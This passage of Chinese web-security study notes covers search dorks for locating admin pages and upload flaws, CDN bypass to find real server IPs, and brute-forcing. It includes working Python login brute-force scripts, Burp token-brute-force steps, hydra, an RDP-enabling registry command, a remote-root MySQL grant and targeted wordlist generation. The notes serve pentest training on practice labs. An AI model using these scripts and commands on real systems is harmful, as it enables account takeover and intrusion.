class="language-none">site：可以限制你搜索范围的域名；inurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用；intext: 只搜索网页&lt;body&gt;部分中包含的文字(也就是忽略了标题、URL等的文字)；intitle: 查包含关键词的页面，一般用于社工别人的webshell密码；filetype：搜索文件的后缀或者扩展名；intitle：限制你搜索的网页标题；inanchor: 搜素网站锚节点内容cache   # 缓存搜索 cache 关键字 cache:secquan.org 当一个链接无法访问时（或信息被屏蔽时）；当信息已经被修改，想看以前的信息时<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>常用技巧</strong></p><pre class="line-numbers language-none"><code class="language-none">查找后台地址：site:域名inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms查找文本内容：site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|admin|login|sys|managetem|password|username查找可注入点：site:域名 inurl:aspx|jsp|php|asp查找上传漏洞：site:域名 inurl:file|load|editor|Files找eweb编辑器：site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit存在的数据库：site:域名 filetype:mdb|asp|#查看脚本类型：site:域名 filetype:asp&#x2F;aspx&#x2F;php&#x2F;jsp迂回策略入侵：inurl:cms&#x2F;data&#x2F;templates&#x2F;images&#x2F;index&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="bing语法"><a href="#bing语法" class="headerlink" title="bing语法"></a>bing语法</h4><p>bing 搜索语法与 google类似</p><pre class="line-numbers language-none"><code class="language-none">inbody: 查找正文内容     inbody:密码|登陆intitle: 查找标签内容inanchor: 查找锚节点filetype: 查找文件类型site:返回属于指定网站的网页。若要搜索两个或更多域，请使用逻辑运算符OR对域进行分组ip: 查找特点ip的网站<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="CDN识别-amp-amp-绕过"><a href="#CDN识别-amp-amp-绕过" class="headerlink" title="CDN识别&amp;&amp;绕过"></a>CDN识别&amp;&amp;绕过</h2><p>CDN 的全称是 Content Delivery Network，即内容分发网络。CDN 是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上，但在安全测试过程中，若目标存在 CDN 服务，将会影响到后续的安全测试过程。</p><h3 id="CDN识别-1"><a href="#CDN识别-1" class="headerlink" title="CDN识别"></a>CDN识别</h3><h4 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h4><p>GET 请求页面/文件地址，查看 HTTP 响应头中是否存在 “cache xxx” 的值，若存在，则表示有走 CDN。</p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C17.PNG" alt="17"></p><h4 id="ping域名"><a href="#ping域名" class="headerlink" title="ping域名"></a>ping域名</h4><p>ping 域名，查看 ping 的实际地址，若实际地址为 CDN 节点地址，则表示有走 CDN。</p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C18.PNG" alt="18"></p><h4 id="nslookup解析"><a href="#nslookup解析" class="headerlink" title="nslookup解析"></a>nslookup解析</h4><p>nslookup 域名，若解析结果有多个，很有可能存在CDN，相反，若解析结果只有一个，可能不存在CDN(不能肯定)。</p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C19.PNG" alt="19"></p><h4 id="多地ping"><a href="#多地ping" class="headerlink" title="多地ping"></a>多地ping</h4><p>利用多地区的ping服务器操作，然后对比每个地区ping出的IP结果，查看这些IP是否一致， 如果都是一样的，极有可能不存在CDN。如果IP大多不太一样或者规律性很强，可以尝试查询这些IP的归属地，判断是否存在CDN。</p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C20.PNG" alt="20"></p><h3 id="CDN厂商"><a href="#CDN厂商" class="headerlink" title="CDN厂商"></a>CDN厂商</h3><h4 id="CDN厂商识别"><a href="#CDN厂商识别" class="headerlink" title="CDN厂商识别"></a>CDN厂商识别</h4><p><a href="https://www.cdnplanet.com/tools/cdnfinder/#">https://www.cdnplanet.com/tools/cdnfinder/#</a></p><p><a href="http://tools.bugscaner.com/whichcdn/">http://tools.bugscaner.com/whichcdn/</a></p><p>国外厂商：CloudFlare、StackPath、Fastly、CDNetworks、CacheFly、CloudFront</p><p>国内厂商：阿里云CDN、Ucloud、Nodecache、腾讯云CDN、网宿CDN、白山CDN、金山CDN</p><p>CloudFlare <a href="https://gyzzwk.ml/">https://gyzzwk.ml/</a></p><p>StackPath <a href="https://151.139.113.56/">https://151.139.113.56/</a></p><p> Alibaba <a href="https://www.taobao.com/">https://www.taobao.com/</a></p><p>Wangsu <a href="https://www.chinaz.com/">https://www.chinaz.com</a></p><p>Tencent Cloud <a href="https://qq.com/">https://qq.com</a></p><h3 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h3><h4 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h4><p>CDN是付费的，一些网站主站因为业务需要可能做了CDN加速，但是其他域名可能没有做CDN加速。</p><p>案例：xueersi.com</p><h4 id="第三方网站查询"><a href="#第三方网站查询" class="headerlink" title="第三方网站查询"></a>第三方网站查询</h4><p>网站IP&amp;地址查询：<a href="https://get-site-ip.com/">https://get-site-ip.com/</a></p><p>历史DNS信息查询：<a href="https://securitytrails.com/app/account">https://securitytrails.com/app/account</a></p><h4 id="国外地址请求"><a href="#国外地址请求" class="headerlink" title="国外地址请求"></a>国外地址请求</h4><p>ping工具：<a href="https://ping.sx/ping">https://ping.sx/ping</a></p><p><a href="https://tools.ipip.net/newping.php">https://tools.ipip.net/newping.php</a></p><p>案例：sp910.com</p><h4 id="邮件服务器获取ip"><a href="#邮件服务器获取ip" class="headerlink" title="邮件服务器获取ip"></a>邮件服务器获取ip</h4><p>目标服务器主动连接我们时，不会受到CDN影响目标网站存在邮件验证等功能时，我们通过查看邮件源码，可能获取邮件服务器IP地址 及 发件人 IP地址。</p><h4 id="文件指纹搜索"><a href="#文件指纹搜索" class="headerlink" title="文件指纹搜索"></a>文件指纹搜索</h4><p>查询网站：shodan.io</p><p>icohash.py # 因为 shodan 高级功能要收费，通过脚本可以获取 ico hash。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import mmh3import requestsimport base64response &#x3D; requests.get(&#39;https:&#x2F;&#x2F;www.baidu.com&#x2F;favicon.ico&#39;)favicon &#x3D; base64.b64encode(response.content).decode()hash &#x3D; mmh3.hash(favicon)print(&#39;http.favicon.hash:&#39;+str(hash))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>案例：baidu.com</p><h5 id="mmh3安装方式"><a href="#mmh3安装方式" class="headerlink" title="mmh3安装方式"></a>mmh3安装方式</h5><p><strong>第一种</strong>（推荐）：</p><p>mmh3 依赖下载地址：<a href="https://www.wheelodex.org/projects/mmh3/wheels/mmh3-3.0.0-cp39-cp39-win_amd64.whl/">https://www.wheelodex.org/projects/mmh3/wheels/mmh3-3.0.0-cp39-cp39-win_amd64.whl/</a></p><p>安装指定依赖包: pip install mmh3-3.0.0-cp39-cp39-win_amd64.whl </p><p><strong>第二种</strong>（不推荐，vs2019非常大）：</p><p>安装vs2019 下载组件 C++ ATL v141 </p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C21.PNG" alt="21"></p><p>然后 pip install mmh3 即可成功安装</p><h4 id="工具扫描全网"><a href="#工具扫描全网" class="headerlink" title="工具扫描全网"></a>工具扫描全网</h4><p>扫描全网开放特定端口的IP，然后获取他们的特定页面的HTM源代码，用这些源代码和目标网站的特定页面的HTM源代码做对比，如果匹配上来了，就很可能是目标网站的真实P，工具匹配会匹配出来很多，最后还是要人工筛选。</p><p><strong>zmap扫描全网</strong></p><h2 id="暴力破解1"><a href="#暴力破解1" class="headerlink" title="暴力破解1"></a>暴力破解1</h2><p>“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。</p><p>理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。</p><h3 id="弱口令爆破"><a href="#弱口令爆破" class="headerlink" title="弱口令爆破"></a>弱口令爆破</h3><p>是指使用字典文件进行爆破，字典多为经验积累其中是一些常见的字符组合。</p><p><strong>待补充</strong></p><h4 id="登录认证流程"><a href="#登录认证流程" class="headerlink" title="登录认证流程"></a>登录认证流程</h4><p><strong>待补充</strong></p><h4 id="简单登录认证模型"><a href="#简单登录认证模型" class="headerlink" title="简单登录认证模型"></a>简单登录认证模型</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;    &lt;title&gt;Document&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;    &lt;form action&#x3D;&quot;login.php&quot; method&#x3D;&quot;POST&quot;&gt;    账号: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt;    &lt;br&#x2F;&gt;    密码: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;password&quot;&gt;    &lt;br&#x2F;&gt;    &lt;button type&#x3D;&quot;submit&quot;&gt;登陆&lt;&#x2F;button&gt;    &lt;&#x2F;form&gt;    &lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&lt;?php$username &#x3D; $_POST[&#39;username&#39;];$password &#x3D; $_POST[&#39;password&#39;];echo $username.&quot;&#x2F;&quot;.$password.&quot;\r\n&quot;;if($username &#x3D;&#x3D; &#39;admin&#39; &amp;&amp; $password &#x3D;&#x3D; &#39;123456&#39;)&#123;    echo &quot;欢迎您登陆成功！&quot;;&#125;else &#123;    echo &quot;账号或密码错误！&quot;;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h3><h4 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h4><p>在线靶场 <a href="http://vulfocus.cn/">http://vulfocus.cn/</a> 搜索启动 dvwa</p><p>DVWA靶场登陆账号：admin 密码：password</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">DVWA靶场已有的账号密码：|  1 | admin  &#x2F;  123456|  2 | gordonb &#x2F; abc123|  3 | pablo &#x2F; letmein<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h4><p>在线靶场 <a href="http://vulfocus.cn/">http://vulfocus.cn/</a> 搜索启动 pikachu</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">pikachu靶场已有的账号密码：|  1 | admin  &#x2F;  123456|  2 | pikachu &#x2F; 000000|  3 | test   &#x2F;  abc123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="burp抓token爆破"><a href="#burp抓token爆破" class="headerlink" title="burp抓token爆破"></a>burp抓token爆破</h3><h4 id="token是什么？"><a href="#token是什么？" class="headerlink" title="token是什么？"></a>token是什么？</h4><p> <strong>1</strong>、<strong>Token的引入</strong>：Token是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，Token便应运而生。</p><p> <strong>2</strong>、<strong>Token的定义</strong>：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。</p><p> <strong>3</strong>、<strong>使用Token的目的</strong>：Token的目的是为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮。</p><h4 id="Token认证过程"><a href="#Token认证过程" class="headerlink" title="Token认证过程"></a>Token认证过程</h4><p><strong>基于Token的身份验证的过程如下:</strong></p><p>1.用户通过用户名和密码发送请求。</p><p>2.服务器端程序验证。</p><p>3.服务器端程序返回一个带签名的token 给客户端。</p><p>4.客户端储存token,并且每次访问API都携带Token到服务器端的。</p><p>5.服务端验证token，校验成功则返回请求数据，校验失败则返回错误码。</p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C22.PNG" alt="22"></p><p><strong>简单示例：</strong></p><ol><li>burp抓包发送到intruder,爆破模式选择Pitchfork</li></ol><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C25.PNG" alt="25"></p><ol start="2"><li>payloads中第二个数据选择Recursive grep</li></ol><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C26.PNG" alt="26"></p><ol start="3"><li>在Resourse Pool模块下的线程要调为1，因为一个token只能一时间产生一个</li></ol><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C27.PNG" alt="27"></p><ol start="4"><li>Options模块的Grep-Extract模式里添加token，有的token重复刷新会界面302获取不了，记得更换新的token</li></ol><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C28.PNG" alt="28"></p><ol start="5"><li>回到payloads模块加一新的token</li></ol><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C28.PNG" alt="28"></p><ol start="6"><li>爆破，找出正确密码</li></ol><h3 id="Basic认证爆破"><a href="#Basic认证爆破" class="headerlink" title="Basic认证爆破"></a>Basic认证爆破</h3><p>basic认证（基本认证）是从http/1.0就定义的认证方式。即使是如今仍有一部分的网站会使用这种认证方式。</p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C23.PNG" alt="23"></p><h4 id="Basic认证过程"><a href="#Basic认证过程" class="headerlink" title="Basic认证过程"></a>Basic认证过程</h4><p><strong>步骤1</strong> ：当请求的资源须要BASIC认证时，服务器会随状态码401Authorization Requireed，返回带WWW-Authenticate首部字段的响应。该字段内包含认证的方式（BASIC）及 Request-URI安全域字符串（realm）安全</p><p><strong>步骤2</strong> ：接收到状态码401的客户端为了经过BASIC认证，须要将用户ID及密码发送给服务器。发送的字符串内容是由用户ID和密码构成，二者中间以(:)链接后，在通过Base64编码处理。服务器假设用户ID为guest，密码是guest，链接起来就会造成guest：guest这样的字符串。而后通过base64编</p><p>码，最后结果是 Z3VLc3Q6Z3Vlc3Q=。把这串字符串写入首部字段Authrization以后发送请求。网站当用户代理为浏览器时，用户仅输入用户ID和密码便可，以后，浏览器会自动完成到base64编码的转换工作</p><p><strong>步骤3</strong>： 接收到包含首部字段Authorization请求的服务器，会对认证信息的正确性进行验证。若是验证经过，则返回一条包含Request-URI的资源响应编码basic认证虽然采用了Base64编码方式，但这不是加密处理。不须要任何附加信息便可对其解码。换言之，因为明文解码后就是用户id和密码，在http等非加密通讯的路线上进行BASIC认证的工程中，若是被窃听，被盗的可能性极高。</p><p>地址：<a href="http://vulfocus.io/">http://vulfocus.io/</a> 搜索关键字 tomcat-pass-getshell</p><p><strong>操作过程待补充</strong></p><h3 id="python编写爆破脚本"><a href="#python编写爆破脚本" class="headerlink" title="python编写爆破脚本"></a>python编写爆破脚本</h3><h4 id="python异常处理"><a href="#python异常处理" class="headerlink" title="python异常处理"></a>python异常处理</h4><p>参考链接：<a href="https://www.runoob.com/python/python-exceptions.html">https://www.runoob.com/python/python-exceptions.html</a></p><h5 id="什么是异常？"><a href="#什么是异常？" class="headerlink" title="什么是异常？"></a>什么是异常？</h5><p>异常即是一个事件，该事件会在程序执行过程中发生，影响了程序的正常执行。一般情况下，在Python无法正常处理程序时就会发生一个异常。</p><p>异常是Python对象，表示一个错误。当Python脚本发生异常时我们需要捕获处理它，否则程序会终止执行。</p><h5 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h5><p>捕捉异常可以使用try/except语句。</p><p>try/except语句用来检测try语句块中的错误，从而让except语句捕获异常信息并处理。</p><p>如果你不想在异常发生时结束你的程序，只需在try里捕获它。</p><p>语法：</p><p>以下为简单的<em>try….except…else</em>的语法：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">try:&lt;语句&gt;        #运行别的代码except &lt;名字&gt;：&lt;语句&gt;        #如果在try部份引发了&#39;name&#39;异常except &lt;名字&gt;，&lt;数据&gt;:&lt;语句&gt;        #如果引发了&#39;name&#39;异常，获得附加的数据else:&lt;语句&gt;        #如果没有异常发生<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">try:    fh &#x3D; open(&quot;testfile&quot;, &quot;w&quot;)    fh.write(&quot;这是一个测试文件，用于测试异常!!&quot;)except IOError:    print(&quot;Error: 没有找到文件或读取文件失败&quot;)    exit(&quot;发生致命错误, 程序结束!&quot;)else:    print(&quot;内容写入文件成功&quot;)    fh.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="mysite爆破脚本"><a href="#mysite爆破脚本" class="headerlink" title="mysite爆破脚本"></a>mysite爆破脚本</h4><p>burp.py</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">import requestsimport timeimport datetimeuser_arr &#x3D; open(&quot;users.txt&quot;, &quot;r&quot;, encoding&#x3D;&quot;utf8&quot;).readlines()# print(user_arr)pwd_arr &#x3D; open(&quot;passwd.txt&quot;, &quot;r&quot;, encoding&#x3D;&quot;utf8&quot;).readlines()# print(pwd_arr)f &#x3D; open(&quot;success.txt&quot;, &quot;a&quot;, encoding&#x3D;&quot;utf8&quot;)for j in user_arr:    for i in pwd_arr:        data &#x3D; &#123;            &quot;username&quot;: j.strip(),            &quot;password&quot;: i.strip(),       &#125;        print(&quot;尝试使用 &quot;+j.strip() + &quot; &#x2F; &quot; + i.strip() + &quot; 登陆&quot;)                try:            res &#x3D; requests.post(&quot;http:&#x2F;&#x2F;www.mysite.com&#x2F;&quot;, data&#x3D;data, allow_redirects&#x3D;False, timeout&#x3D;10, verify&#x3D;False)                    except (WindowsError) as e:            # print(e.args)            # print(type(e))            print(repr(e))            print(&quot;网络连接异常, 程序将自动退出&quot;)            exit()            except Exception as e:            print(&quot;未知错误，请查看error.log&quot;)            open(&quot;error.log&quot;, &quot;a&quot;, encoding&#x3D;&quot;utf8&quot;).write(str(datetime.datetime.now()) + &quot; --- &quot; + repr(e) + &quot;\n&quot;)            exit()                    else:            if(res.status_code &#x3D;&#x3D; 302):                f.write(j.strip() + &quot;:&quot; + i)                print(&quot;success&quot; + &quot;账号为 &quot; + j.strip() + &quot; 密码为 &quot; + i.strip())                time.sleep(2)                breakprint(&quot;运行结束~！&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="pikachu-token验证爆破脚本"><a href="#pikachu-token验证爆破脚本" class="headerlink" title="pikachu token验证爆破脚本"></a>pikachu token验证爆破脚本</h4><p>burp_token.py</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">import requestsimport timeimport datetimeimport resession &#x3D; requests.Session()user_arr &#x3D; open(&quot;users.txt&quot;, &quot;r&quot;, encoding&#x3D;&quot;utf8&quot;).readlines()pwd_arr &#x3D; open(&quot;passwd.txt&quot;, &quot;r&quot;, encoding&#x3D;&quot;utf8&quot;).readlines()f &#x3D; open(&quot;success.txt&quot;, &quot;a&quot;, encoding&#x3D;&quot;utf8&quot;)for j in user_arr:    for i in pwd_arr:        try:            res &#x3D; session.get(&quot;http:&#x2F;&#x2F;www.pikachu.com&#x2F;vul&#x2F;burteforce&#x2F;bf_token.php&quot;, timeout&#x3D;10, verify&#x3D;False)        except (WindowsError) as e:            print(repr(e))            print(&quot;网络连接异常, 程序将自动退出&quot;)            exit()        except Exception as e:            print(&quot;未知错误，请查看error.log&quot;)            open(&quot;error.log&quot;, &quot;a&quot;, encoding&#x3D;&quot;utf8&quot;).write(str(datetime.datetime.now()) + &quot; --- &quot; + repr(e) + &quot;\n&quot;)            exit()        else:            token &#x3D; re.findall(&#39;&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;token&quot; value&#x3D;&quot;(.*?)&quot;&#39;,res.text)[0]        data &#x3D; &#123;            &quot;username&quot;: j.strip(),            &quot;password&quot;: i.strip(),            &quot;token&quot;: token,            &quot;submit&quot;: &quot;Login&quot;      &#125;        print(&quot;尝试使用 &quot;+j.strip() + &quot; &#x2F; &quot; + i.strip() + &quot; --- token: &quot;+ token +&quot; 登陆&quot;)        try:            res &#x3D; session.post(&quot;http:&#x2F;&#x2F;www.pikachu.com&#x2F;vul&#x2F;burteforce&#x2F;bf_token.php&quot;, data&#x3D;data,timeout&#x3D;10, verify&#x3D;False, allow_redirects&#x3D;False)        except (WindowsError) as e:            print(repr(e))            print(&quot;网络连接异常, 程序将自动退出&quot;)            exit()        except Exception as e:            print(&quot;未知错误，请查看error.log&quot;)            open(&quot;error.log&quot;, &quot;a&quot;, encoding&#x3D;&quot;utf8&quot;).write(str(datetime.datetime.now()) + &quot; --- &quot; + repr(e) + &quot;\n&quot;)            exit()        else:            if(&quot;username or password is not exists&quot; not in res.text):                f.write(j.strip() + &quot;:&quot; + i)                print(&quot;success&quot; + &quot;账号为 &quot; + j.strip() + &quot; 密码为 &quot; + i.strip())                time.sleep(2)                breakprint(&quot;运行结束~！&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="暴力破解2"><a href="#暴力破解2" class="headerlink" title="暴力破解2"></a>暴力破解2</h2><h3 id="CS架构破解"><a href="#CS架构破解" class="headerlink" title="CS架构破解"></a>CS架构破解</h3><p>B/S架构即 Brouser/Server ，是一种浏览器和服务器架构模式；CS架构是指服务器-客户机。服务器-客户机，即Client/Server(C/S)结构。</p><h4 id="hydra爆破工具"><a href="#hydra爆破工具" class="headerlink" title="hydra爆破工具"></a>hydra爆破工具</h4><p>hydra 可以爆破 ftp / ssh / telnet / mysql / rdp 等各种服务。</p><p>常用参数</p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C24.PNG" alt="24"></p><h5 id="学习平台实操"><a href="#学习平台实操" class="headerlink" title="学习平台实操"></a>学习平台实操</h5><p>登陆vpn访问学习平台：<a href="https://edu.work.ltsec.com/index">https://edu.work.ltsec.com/index</a> 访问暴力穷举破解进行练习</p><h5 id="mysql开启远程登录"><a href="#mysql开启远程登录" class="headerlink" title="mysql开启远程登录"></a>mysql开启远程登录</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">登陆mysqluse &#96;mysql&#96;;# 注意将密码替换掉GRANT ALL PRIVILEGES ON *.* TO &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;你的密码&#39; WITH GRANTOPTION;FLUSH PRIVILEGES;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="windows开启rdp远程桌面服务"><a href="#windows开启rdp远程桌面服务" class="headerlink" title="windows开启rdp远程桌面服务"></a>windows开启rdp远程桌面服务</h5><pre class="line-numbers language-none"><code class="language-none">查看远程端口或者使用注册表REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp &#x2F;v PortNumber再set &#x2F;a a&#x3D;0xd3d当远程桌面服务被关闭时，可以用注册表命令开启REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="超级弱口令爆破工具"><a href="#超级弱口令爆破工具" class="headerlink" title="超级弱口令爆破工具"></a>超级弱口令爆破工具</h4><p>填写目标 ip 、账户名或账号密码字典 进行爆破破解。</p><p><strong>操作待补充</strong></p><h5 id="自定义端口号"><a href="#自定义端口号" class="headerlink" title="自定义端口号"></a>自定义端口号</h5><p>点击设置可更改服务默认端口。</p><p><strong>操作待补充</strong></p><h4 id="社工字典生成"><a href="#社工字典生成" class="headerlink" title="社工字典生成"></a>社工字典生成</h4><p>当你收集到目标的具体信息后，你就可以通过工具来智能化生成关于目标的字典。当对目标进行渗透测试的时候，常见密码爆破不成功，大批量的字典耗时太长时，就需要一份结合具体目标的带社工性质的字典，可以很大提升爆破效率。</p><h5 id="亦思"><a href="#亦思" class="headerlink" title="亦思"></a>亦思</h5><p><strong>操作待补充</strong></p><h5 id="cupp"><a href="#cupp" class="headerlink" title="cupp"></a>cupp</h5><p>Cupp是一款用Python语言写成的可交互性的字典生成脚本</p><p>Kali 安装 Cupp: apt-get install cupp</p><p><strong>查看命令：****cupp</strong></p><p><strong>参数说明</strong></p><pre class="line-numbers language-none"><code class="language-none">参数名 参数含义-v 查看cupp版本号-h 查看参数列表-l 从github仓库里面下载字典-i 使用交互式的提问创建用户字典-w 在已存在的字典上进行扩展<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>执行cupp -i生成字典</strong></p><p>输入被攻击目标的姓、名、外号、生日、父母的名字、外号、生日、子女的名字、外号、生日等等一系列的信息。如果你有这些信息，直接输入，如果没有直接回车进行下一步。然后是宠物、公司等名称，需要不需要加关键字当前缀后缀等等，如果不知道或者不想加，直接回车跳过最后在命令执行的目录里生成字典文件。</p><p>注意：输入生日信息的时候是按照日、月、年的顺序，如11021990就是1990年2月11</p><h3 id="验证码绕过"><a href="#验证码绕过" class="headerlink" title="验证码绕过"></a>验证码绕过</h3><p>验证码原理：客户端发起请求-&gt;服务端响应并创建一个新的SessionID同时生成随机验证码，将验证码和SessionID一并返回给客户端-&gt;客户端提交验证码连同SessionID给服务端-&gt;服务端验证验证码同时销毁当前会话，返回给客户端结果。</p><p>【客户端可能存在的安全问题】</p><p>1、有的网站验证码由本地js生成仅仅在本地用js验证。可以在本地禁用js，用burp把验证字段删除。</p><p>2、有的网站把验证码输出到客户端html中，送到客户端Cookie或response headers。</p><p>3、有些网站默认不显示验证码，而是在输入错误一定数量之后才需要验证验证码，开发人员可能在Cookie中写入一个标记loginErr，用来记录错误数量，则可以不更新Cookie中的loginErr值反复提交，验证码就不会出现。</p><p>【服务端可能存在的安全问题】</p><p>1、验证码不过期，没有及时销毁会话导致同一验证码反复可用。攻击者可以在Cookie中带固定的sessionID和固定的验证码字符串。</p><p>2、没有对验证码进行非空判断，导致可以直接删除验证码参数。</p><p>3、产生的验证码问题有限</p><h4 id="验证码固定"><a href="#验证码固定" class="headerlink" title="验证码固定"></a>验证码固定</h4><p>导致验证码不刷新（固定）的原因是：登录密码错误之后，session中的值没有更新，验证码不变。验证码不刷新通常有以下两种情况：无条件不刷新、有条件不刷新。</p><h5 id="无条件不刷新"><a href="#无条件不刷新" class="headerlink" 